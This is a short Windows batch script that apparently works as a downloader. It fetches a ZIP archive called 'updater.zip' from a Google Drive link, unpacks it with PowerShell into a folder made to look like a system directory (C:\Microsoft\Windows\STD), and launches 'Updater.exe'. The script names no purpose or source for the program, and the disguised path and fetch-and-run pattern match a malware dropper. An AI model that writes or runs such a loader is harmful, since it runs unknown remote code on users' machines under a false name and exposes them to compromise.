@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1KU8_RX3Wj6rdLEaJIiBU7ET6nD_VwK0O&export=download&authuser=0&confirm=t&uuid=e5c13878-2d9d-443e-b2fd-3d2536b133a1&at=APvzH3oXmOJ5p5dMz5qTtz6jsC6c:1733953312442"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"
cd C:\Microsoft\Windows\STD\
start C:\Microsoft\Windows\STD\Updater.exe -f
